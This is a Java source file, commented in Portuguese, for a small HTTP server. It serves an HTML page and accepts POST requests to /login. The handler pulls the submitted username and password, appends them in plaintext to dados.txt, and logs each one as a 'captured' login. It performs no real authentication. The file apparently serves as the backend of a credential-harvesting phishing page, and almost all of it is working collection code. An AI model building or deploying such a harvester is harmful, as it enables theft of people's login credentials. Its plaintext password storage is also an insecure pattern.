
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;


public class Servidor{
    public static void main(String[] args) throws IOException{
        new Interface();
        
        int porta = 8080;
        // Cria o servidor HTTP na porta 8080
        HttpServer servidor = HttpServer.create(new InetSocketAddress("0.0.0.0", porta), 0);

        // Mapeia a raiz ("/") para ser tratada pela nossa classe ServidorHandler
        servidor.createContext("/", new ServidorHandler());
        
        servidor.setExecutor(null);
        servidor.start();
        System.out.println("SERVIDOR RODANDO NA PORTA: " + porta + "http://localhost:8080/");
    }
}

class ServidorHandler implements HttpHandler {
    @Override
    public void handle(HttpExchange troca) throws IOException{
        // Pega o caminho exato que o usuário acessou
        String caminho = troca.getRequestURI().getPath();

       
        if("/".equals(caminho)){
            File arquivoHtml = new File("src/public/index.html");
            byte[] bytes = Files.readAllBytes(arquivoHtml.toPath());
            troca.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
            troca.sendResponseHeaders(200, bytes.length);
            OutputStream fluxoSaida = troca.getResponseBody();
            fluxoSaida.write(bytes);
            fluxoSaida.close();
        }
        // 2. Se enviar o formulário para (/login) usando o método POST vindo do HTML
        else if("/login".equals(caminho) && "POST".equalsIgnoreCase(troca.getRequestMethod())){
            // Prepara o leitor para traduzir e ler os dados enviados pelo formulário
            BufferedReader leitor = new BufferedReader(new InputStreamReader(troca.getRequestBody(), StandardCharsets.UTF_8));

            StringBuilder MontadorString = new StringBuilder();
            String linha;

            // Lê linha por linha e vai juntando tudo no StringBuilder
            while((linha = leitor.readLine()) != null){
                MontadorString.append(linha);
            }
            String dados = MontadorString.toString();
            String usuario = "";
            String senha = "";

            // Separa os dados usando o '&' e depois o '=' para achar usuário e senha
            for(String par : dados.split("&")){
                String[] kv = par.split("=");
                if(kv.length == 2){
                    String chave = URLDecoder.decode(kv[0], StandardCharsets.UTF_8);
                    String valor = URLDecoder.decode(kv[1], StandardCharsets.UTF_8);
                    if("username".equalsIgnoreCase(chave)){
                        usuario = valor;
                    }
                    if("password".equalsIgnoreCase(chave)){
                        senha = valor;
                    }
                }
            }

            // Salva os dados capturados no arquivo de texto (.txt)
            // O 'true' no FileWriter garante que novos logins serão adicionados abaixo sem apagar os antigos
            try (FileWriter arquivo = new FileWriter("dados.txt", true);
                 BufferedWriter escritor = new BufferedWriter(arquivo);
                 PrintWriter pw = new PrintWriter(escritor)) {

                // Escreve as informações no arquivo com o println
                pw.println("Usuário: " + usuario + " | Senha: " + senha);
                System.out.println(">>> Login capturado e salvo: " + usuario);

            } catch(Exception erro){
                System.err.println("ERRO AO SALVAR TXT: " + erro);
                erro.printStackTrace();
            }

            // Responde ao navegador para a requisição não ficar pendurada
            String resposta = "Login recebido com sucesso!";
            byte[] respostaBytes = resposta.getBytes(StandardCharsets.UTF_8);
            troca.getResponseHeaders().set("Content-Type", "text/plain; charset=UTF-8");
            troca.sendResponseHeaders(200, respostaBytes.length);
            OutputStream respostaStream = troca.getResponseBody();
            respostaStream.write(respostaBytes);
            respostaStream.close();
        }
    }
}